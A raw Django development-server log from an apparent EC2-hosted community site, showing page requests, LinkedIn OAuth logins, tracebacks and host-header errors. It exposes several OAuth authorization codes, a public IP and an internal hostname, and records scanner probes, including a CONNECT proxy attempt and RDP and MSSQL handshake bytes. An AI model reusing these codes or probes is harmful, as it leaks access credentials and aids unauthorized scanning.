[08/Dec/2018 17:08:45] "GET /accounts/media/media/favicon.ico HTTP/1.1" 404 6027
[08/Dec/2018 17:08:47] "GET /profile/4 HTTP/1.1" 302 0
[08/Dec/2018 17:08:47] "GET /accounts/login/?next=/profile/4 HTTP/1.1" 200 2576
[08/Dec/2018 17:08:54] "GET /community/3/ HTTP/1.1" 200 9489
[08/Dec/2018 17:08:55] "GET /media/media/logo.png HTTP/1.1" 304 0
[08/Dec/2018 17:08:57] "GET /profile/4 HTTP/1.1" 302 0
[08/Dec/2018 17:08:57] "GET /accounts/login/?next=/profile/4 HTTP/1.1" 200 2576
[08/Dec/2018 17:09:01] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[08/Dec/2018 17:09:10] "GET /oauth/complete/linkedin-oauth2/?code=AQQ9Uoqko_MO4_gfl-Ddl6kwRqxBCR30_zGrJCkI17HA9xX-fAa2r_ZQ0xXLWD_7-j00NOED7AGOxmEtHMQCCYZAshCqM0R3ol_R3vj_3YZZdC8eAxIkE2mCaCRmng1KEfYkoHTRSDVygPtAeQZn84M_H5pBY4omfKZ6f_Pbt9P4w1cSWiLn-fA4aPU2Ig&state=VS9RPfLlvjUqJCHNs6QDwzYg20x7SxC4 HTTP/1.1" 302 0
[08/Dec/2018 17:09:10] "GET / HTTP/1.1" 200 12081
[08/Dec/2018 17:09:13] "GET /community/3/ HTTP/1.1" 200 9844
[08/Dec/2018 17:09:15] "GET /profile/4 HTTP/1.1" 200 17418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 17:59:33] "GET / HTTP/1.0" 400 62418
[08/Dec/2018 18:27:01] "GET / HTTP/1.1" 200 12081
[08/Dec/2018 18:27:01] "GET /media/media/logo.png HTTP/1.1" 200 11255
[08/Dec/2018 18:27:02] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Not Found: /logo.jpeg
[08/Dec/2018 18:27:03] "GET /logo.jpeg HTTP/1.1" 404 5958
[08/Dec/2018 18:27:52] "GET /community/3 HTTP/1.1" 301 0
[08/Dec/2018 18:27:53] "GET /community/3/ HTTP/1.1" 200 9844
Not Found: /community/3/logo.jpeg
[08/Dec/2018 18:27:53] "GET /community/3/logo.jpeg HTTP/1.1" 404 5994
[08/Dec/2018 18:27:57] "GET /profile/4 HTTP/1.1" 200 17418
Not Found: /profile/logo.jpeg
[08/Dec/2018 18:27:58] "GET /profile/logo.jpeg HTTP/1.1" 404 5982
[08/Dec/2018 18:28:16] "GET /login/ HTTP/1.1" 302 0
[08/Dec/2018 18:28:16] "GET / HTTP/1.1" 200 12081
[08/Dec/2018 18:28:30] "GET /profile/3 HTTP/1.1" 200 22273
[08/Dec/2018 18:28:33] "GET /profile/3/mycommunities HTTP/1.1" 200 5601
Not Found: /profile/3/logo.jpeg
[08/Dec/2018 18:28:34] "GET /profile/3/logo.jpeg HTTP/1.1" 404 5988
[08/Dec/2018 18:28:38] "GET /profile/3/communities_as_admin HTTP/1.1" 200 5612
[08/Dec/2018 18:28:43] "GET /community/3/ HTTP/1.1" 200 9844
[08/Dec/2018 18:29:18] "GET /community/3/members_list HTTP/1.1" 200 6176
[08/Dec/2018 18:29:24] "GET /profile/4 HTTP/1.1" 200 17418
[08/Dec/2018 18:29:27] "GET /login/ HTTP/1.1" 302 0
[08/Dec/2018 18:29:28] "GET / HTTP/1.1" 200 12081
[08/Dec/2018 18:29:32] "GET /logout HTTP/1.1" 302 0
[08/Dec/2018 18:29:32] "GET /login/ HTTP/1.1" 200 2576
[08/Dec/2018 18:29:33] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
Not Found: /login/logo.jpeg
[08/Dec/2018 18:29:34] "GET /login/logo.jpeg HTTP/1.1" 404 5976
[08/Dec/2018 18:29:35] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
Not Found: /login/logo.jpeg
[08/Dec/2018 18:35:55] "GET /login/logo.jpeg HTTP/1.1" 404 5976
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 19:58:33] "GET / HTTP/1.0" 400 62419
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 20:02:21] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 20:11:05] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 20:11:31] "GET / HTTP/1.1" 400 62130
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[08/Dec/2018 20:11:31] "GET / HTTP/1.1" 500 59
----------------------------------------
Exception happened during processing of request from ('61.239.133.115', 45914)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/usr/lib64/python3.7/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 21:03:53] "GET / HTTP/1.0" 400 62415
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 21:04:14] "GET / HTTP/1.1" 400 62405
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 21:49:18] "GET / HTTP/1.1" 400 62412
Invalid HTTP_HOST header: 'xui.ptlogin2.qq.com:443'. You may need to add 'xui.ptlogin2.qq.com' to ALLOWED_HOSTS.
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /xui.ptlogin2.qq.com:443
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
Bad Request: /http:/18.220.31.143/
[08/Dec/2018 21:59:57] "CONNECT xui.ptlogin2.qq.com:443 HTTP/1.1" 400 62534
[08/Dec/2018 21:59:57] "OPTION / HTTP/1.1" 400 62151
[08/Dec/2018 21:59:57] "GET http://18.220.31.143/ HTTP/1.1" 400 62350
[08/Dec/2018 21:59:59] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
[08/Dec/2018 21:59:59] "  à          " 400 -
[08/Dec/2018 21:59:59] code 400, message Bad request syntax ('\x00\x9c\x00\x01\x1a+<M\x00\x01\x00\x00\x01\x00M\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
[08/Dec/2018 21:59:59] "  +<M    M                                                                                                                                           " 400 -
[08/Dec/2018 21:59:59] code 400, message Bad request version ('\x03\x00(\x00\x04ÿU\x01\x00\x08\x00\x00\x00MSSQLServer\x00d!\x00\x00')
[08/Dec/2018 21:59:59] " 4            ( ÿU    MSSQLServer d!  " 400 -
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 22:25:02] "GET / HTTP/1.0" 400 62417
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 22:27:14] "GET / HTTP/1.0" 400 62418
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 22:35:31] "GET / HTTP/1.1" 400 62407
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
Bad Request: /
[08/Dec/2018 22:38:16] "GET / HTTP/1.1" 400 62406
[08/Dec/2018 22:38:16] "GET / HTTP/1.1" 400 62406
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 22:55:30] "GET / HTTP/1.0" 400 62721
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 23:08:05] "GET / HTTP/1.1" 400 62405
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[08/Dec/2018 23:38:56] "GET / HTTP/1.1" 400 62406
[09/Dec/2018 00:03:11] "GET /creategroup/ HTTP/1.1" 200 8031
[09/Dec/2018 00:03:13] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:03:20] "GET /login/ HTTP/1.1" 302 0
Not Found: /creategroup/logo.jpeg
[09/Dec/2018 00:03:20] "GET /creategroup/logo.jpeg HTTP/1.1" 404 5994
[09/Dec/2018 00:03:21] "GET / HTTP/1.1" 200 12081
[09/Dec/2018 00:03:24] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:03:27] "GET /profile/4 HTTP/1.1" 200 22276
Not Found: /logo.jpeg
[09/Dec/2018 00:03:27] "GET /logo.jpeg HTTP/1.1" 404 5958
Not Found: /profile/logo.jpeg
[09/Dec/2018 00:03:29] "GET /profile/logo.jpeg HTTP/1.1" 404 5982
[09/Dec/2018 00:03:31] "GET /logout HTTP/1.1" 302 0
[09/Dec/2018 00:03:34] "GET /login/ HTTP/1.1" 200 2576
[09/Dec/2018 00:03:38] "GET /media/media/logo.jpeg HTTP/1.1" 304 0
[09/Dec/2018 00:03:44] "GET /login/ HTTP/1.1" 200 2576
Not Found: /login/logo.jpeg
[09/Dec/2018 00:03:45] "GET /login/logo.jpeg HTTP/1.1" 404 5976
[09/Dec/2018 00:03:46] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[09/Dec/2018 00:03:48] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[09/Dec/2018 00:04:00] "GET /login/ HTTP/1.1" 200 2576
Not Found: /dashboard/
[09/Dec/2018 00:04:05] "GET /dashboard/ HTTP/1.1" 404 5961
Not Found: /favicon.ico
[09/Dec/2018 00:04:06] "GET /favicon.ico HTTP/1.1" 404 5964
Not Found: /dashboard/
[09/Dec/2018 00:04:08] "GET /dashboard/ HTTP/1.1" 404 5961
[09/Dec/2018 00:04:13] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[09/Dec/2018 00:04:17] "GET /oauth/complete/linkedin-oauth2/?code=AQRsJKZ8PV8XUdVXFpy0gOjL5MFQ2FJ8DPqDKmfCfnKVO5vZnVDlN9iKt1Vp4SCltn2aB78W5bpTraWa3xna8Baq4_8hmaSI56jvXm3xXa1F8cG4X_WYRWUOf0XLMA3M09JFu_LlZNgCUcH_OffK1rNDfw5_p3bcPnl_COF-J-tFmUanDwhurZ1OqsoHAQ&state=GcC74h49gJl6amhxnOYQ8qSTTt2qEb1z HTTP/1.1" 302 0
[09/Dec/2018 00:04:17] "GET / HTTP/1.1" 200 12081
Not Found: /logo.jpeg
[09/Dec/2018 00:04:18] "GET /logo.jpeg HTTP/1.1" 404 5958
[09/Dec/2018 00:04:19] "GET /profile/4 HTTP/1.1" 200 22276
[09/Dec/2018 00:04:23] "GET /profile/4 HTTP/1.1" 200 22276
[09/Dec/2018 00:04:24] "GET /profile/4/mycommunities HTTP/1.1" 200 5601
Not Found: /profile/4/logo.jpeg
[09/Dec/2018 00:04:24] "GET /profile/4/logo.jpeg HTTP/1.1" 404 5988
[09/Dec/2018 00:04:25] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5051
[09/Dec/2018 00:04:27] "GET /profile/4 HTTP/1.1" 200 22276
[09/Dec/2018 00:04:29] "GET /profile/4 HTTP/1.1" 200 22276
[09/Dec/2018 00:04:30] "GET /profile/4 HTTP/1.1" 200 22276
[09/Dec/2018 00:04:32] "GET /creategroup/ HTTP/1.1" 200 8031
[09/Dec/2018 00:04:36] "GET /creategroup/ HTTP/1.1" 200 8031
[09/Dec/2018 00:04:41] "GET /profile/4 HTTP/1.1" 200 22276
[09/Dec/2018 00:04:42] "GET /creategroup/ HTTP/1.1" 200 8031
[09/Dec/2018 00:05:15] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 00:05:16] "GET / HTTP/1.1" 200 12081
[09/Dec/2018 00:28:13] "GET / HTTP/1.1" 200 11372
[09/Dec/2018 00:28:14] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 304 0
[09/Dec/2018 00:28:14] "GET /media/media/logo.png HTTP/1.1" 200 11255
Not Found: /logo.jpeg
[09/Dec/2018 00:28:15] "GET /logo.jpeg HTTP/1.1" 404 5958
[09/Dec/2018 00:28:33] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[09/Dec/2018 00:28:46] "GET /oauth/complete/linkedin-oauth2/?code=AQQAfq5skOm-qs001ieF9mPsnSBkKv6H5vkmaFXP1EMC0vaXATqHAZlBSEAdEPx9ZwQXuaxtbcbll0GxtaGKL7SX4uYtWkqWP0yJzC1pY_CAQXIjAUV7W32yKz3iLcxmUW-I3O_yYOUAC8-T-zDf9uNxEn_BLLwY6vCXoFXF9uqgT7WE9vgIM5Q2kk4uSg&state=brtecYoyQgT7GLKraB0m1g7LmD1IJZHN HTTP/1.1" 302 0
Internal Server Error: /dashboard/join
Traceback (most recent call last):
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
TypeError: dashboard() got an unexpected keyword argument 'data'
[09/Dec/2018 00:28:46] "GET /dashboard/join HTTP/1.1" 500 63262
Not Found: /dashboard/
[09/Dec/2018 00:28:52] "GET /dashboard/ HTTP/1.1" 404 5961
[09/Dec/2018 00:29:00] "GET / HTTP/1.1" 200 12081
[09/Dec/2018 00:29:00] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:29:01] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:29:05] "GET /profile/4 HTTP/1.1" 200 22276
[09/Dec/2018 00:29:05] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:29:07] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Not Found: /profile/logo.jpeg
[09/Dec/2018 00:29:07] "GET /profile/logo.jpeg HTTP/1.1" 404 5982
[09/Dec/2018 00:29:08] "GET /creategroup/ HTTP/1.1" 200 8031
[09/Dec/2018 00:29:09] "GET /media/media/logo.png HTTP/1.1" 200 11255
Not Found: /creategroup/logo.jpeg
[09/Dec/2018 00:29:10] "GET /creategroup/logo.jpeg HTTP/1.1" 404 5994
[09/Dec/2018 00:29:12] "GET /profile/4 HTTP/1.1" 200 22276
[09/Dec/2018 00:29:13] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:29:14] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:29:16] "GET /profile/4/mycommunities HTTP/1.1" 200 5601
[09/Dec/2018 00:29:16] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:29:18] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:29:32] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5051
[09/Dec/2018 00:29:33] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:29:35] "GET /profile/4/mycommunities HTTP/1.1" 200 5601
[09/Dec/2018 00:29:35] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:29:37] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:29:38] "GET /profile/4/mycommunities HTTP/1.1" 200 5601
[09/Dec/2018 00:29:39] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:29:40] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:29:42] "GET /community/3 HTTP/1.1" 301 0
[09/Dec/2018 00:29:42] "GET /community/3/ HTTP/1.1" 200 9844
[09/Dec/2018 00:29:43] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:29:44] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:30:24] "GET /profile/3 HTTP/1.1" 200 17414
[09/Dec/2018 00:30:25] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:30:43] "GET /profile/3 HTTP/1.1" 200 17414
[09/Dec/2018 00:30:44] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:30:47] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 00:30:48] "GET / HTTP/1.1" 200 12081
[09/Dec/2018 00:30:48] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:30:49] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:31:18] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 00:31:19] "GET / HTTP/1.1" 200 12081
[09/Dec/2018 00:31:19] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:31:21] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[09/Dec/2018 00:31:28] "GET / HTTP/1.0" 400 62417
[09/Dec/2018 00:31:57] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 00:31:57] "GET / HTTP/1.1" 200 12081
[09/Dec/2018 00:31:57] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:31:59] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:35:03] "GET /profile/4 HTTP/1.1" 200 22289
[09/Dec/2018 00:35:03] "GET /logout HTTP/1.1" 302 0
[09/Dec/2018 00:35:04] "GET /login/ HTTP/1.1" 200 2576
[09/Dec/2018 00:35:04] "GET /media/media/logo.png HTTP/1.1" 200 11255
Not Found: /login/logo.jpeg
[09/Dec/2018 00:35:05] "GET /login/logo.jpeg HTTP/1.1" 404 5976
[09/Dec/2018 00:35:06] "GET /media/media/favicon.ico HTTP/1.1" 200 32988
[09/Dec/2018 00:35:07] "GET /login/ HTTP/1.1" 200 2576
[09/Dec/2018 00:35:07] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:35:10] "GET /login/ HTTP/1.1" 200 2576
[09/Dec/2018 00:35:10] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:37:10] "GET /login/ HTTP/1.1" 200 2576
[09/Dec/2018 00:37:10] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:37:14] "GET /login/ HTTP/1.1" 200 2576
[09/Dec/2018 00:37:15] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:37:21] "GET /oauth/login/linkedin-oauth2/ HTTP/1.1" 302 0
[09/Dec/2018 00:37:22] "GET /oauth/complete/linkedin-oauth2/?code=AQQiWSwxJMQBA2oUTgrPwZnptOKn__LQttNWeP5b3D-CX8WtCY41uApqH-hZWHcd9VtIs1IQxytum4hjad9wkG-wOp9XgxKf3Qv-NBwZyrMKXsrO7ume0cbfH56ZhgKKVBPz5zWOPWlzxmqQMP6JJDALQUeoHcw0UAlRTZEoo3J8N6xk-F56cRTs9MkoyA&state=VpZ2CxAHStRwa2XGSnJ0NSqZvByR8CPP HTTP/1.1" 302 0
[09/Dec/2018 00:37:23] "GET / HTTP/1.1" 200 12094
[09/Dec/2018 00:37:24] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:37:24] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:37:25] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:37:28] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 00:37:28] "GET / HTTP/1.1" 200 12094
[09/Dec/2018 00:37:29] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:37:30] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:37:33] "GET /creategroup/ HTTP/1.1" 200 8044
[09/Dec/2018 00:37:33] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:37:47] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 00:37:47] "GET / HTTP/1.1" 200 12094
[09/Dec/2018 00:37:48] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:37:49] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:38:07] "GET /?data=&_=1544315869451 HTTP/1.1" 200 211
[09/Dec/2018 00:38:18] "GET /?data=&_=1544315869452 HTTP/1.1" 200 211
[09/Dec/2018 00:38:22] "GET /?data=&_=1544315869453 HTTP/1.1" 200 211
[09/Dec/2018 00:38:25] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 00:38:25] "GET / HTTP/1.1" 200 12094
[09/Dec/2018 00:38:25] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:38:27] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:38:37] "GET /?data=&_=1544315907166 HTTP/1.1" 200 211
[09/Dec/2018 00:38:43] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 00:38:44] "GET / HTTP/1.1" 200 12094
[09/Dec/2018 00:38:45] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:38:46] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:38:46] "GET /profile/4 HTTP/1.1" 200 22289
[09/Dec/2018 00:38:46] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:38:47] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:38:59] "GET /profile/4 HTTP/1.1" 200 22289
[09/Dec/2018 00:38:59] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:39:00] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:39:02] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 00:39:02] "GET / HTTP/1.1" 200 12094
[09/Dec/2018 00:39:03] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:39:04] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:39:05] "GET /profile/4 HTTP/1.1" 200 22289
[09/Dec/2018 00:39:05] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:39:06] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:39:08] "GET /profile/4 HTTP/1.1" 200 22289
[09/Dec/2018 00:39:08] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:39:10] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:39:10] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 00:39:11] "GET / HTTP/1.1" 200 12094
[09/Dec/2018 00:39:12] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:39:13] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:39:15] "GET /profile/4 HTTP/1.1" 200 22289
[09/Dec/2018 00:39:15] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:39:18] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:39:18] "GET /login/ HTTP/1.1" 302 0
[09/Dec/2018 00:39:19] "GET / HTTP/1.1" 200 12094
[09/Dec/2018 00:39:19] "GET /media/media/logo.png HTTP/1.1" 200 11255
[09/Dec/2018 00:39:20] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[09/Dec/2018 00:39:21] "GET /profile/4 HTTP/1.1" 200 22289
[09/Dec/2018 00:39:21] "GET /media/media/logo.png HTTP/1.1" 200 11255
